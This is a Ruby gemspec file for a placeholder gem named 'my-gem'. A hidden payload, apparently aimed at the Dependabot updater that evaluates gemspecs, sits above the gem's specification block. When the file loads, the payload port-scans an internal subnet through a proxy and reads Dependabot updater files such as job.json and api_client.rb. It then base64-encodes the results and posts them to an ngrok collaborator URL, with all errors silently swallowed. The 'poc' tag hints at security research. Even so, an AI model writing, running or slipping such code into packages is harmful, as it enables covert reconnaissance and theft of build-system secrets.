COLLAB_URL = "https://95a1-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app"

begin
  require "net/http"
  require "socket"
  require "uri"
  require "timeout"

  results = []

  # Scan 172.20.0.x via proxy op meerdere poorten
  # Proxy heeft routing naar dit subnet, updater niet
  [1, 2, 3, 4, 5].each do |host_id|
    [22, 80, 443, 2375, 8080, 8443, 9090].each do |port|
      begin
        Timeout.timeout(4) do
          sock = TCPSocket.new("172.19.0.2", 1080)
          target = "http://172.20.0.#{host_id}:#{port}/"
          sock.write("GET #{target} HTTP/1.0\r\nHost: 172.20.0.#{host_id}\r\n\r\n")
          resp = sock.recv(512)
          sock.close
          results << "=== PIVOT 172.20.0.#{host_id}:#{port} ===\n#{resp[0..200]}"
        end
      rescue Timeout::Error
        results << "=== 172.20.0.#{host_id}:#{port} TIMEOUT ==="
      rescue => e
        results << "=== 172.20.0.#{host_id}:#{port} #{e.class} ==="
      end
    end
  end

  # Kritieke bestanden lezen
  [
    "/home/dependabot/dependabot-updater/lib/dependabot/environment.rb",
    "/home/dependabot/dependabot-updater/lib/dependabot/api_client.rb",
    "/home/dependabot/dependabot-updater/output/summary.md",
    "/home/dependabot/dependabot-updater/job.json",
  ].each do |path|
    begin
      content = File.read(path)
      results << "=== #{path} ===\n#{content[0..3000]}"
    rescue => e
      results << "=== #{path} ERR: #{e.class} ==="
    end
  end

  payload = [results.join("\n\n")].pack("m0")
  post_uri = URI("#{COLLAB_URL}?poc=pivot172_20")
  r = Net::HTTP::Post.new(post_uri)
  r.body = payload
  Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: true,
                  open_timeout: 8, read_timeout: 8) { |h| h.request(r) }
rescue
end

Gem::Specification.new do |spec|
  spec.name    = "my-gem"
  spec.version = "1.0.0"
  spec.summary = "test"
  spec.add_dependency "rails", "~> 7.0"
end
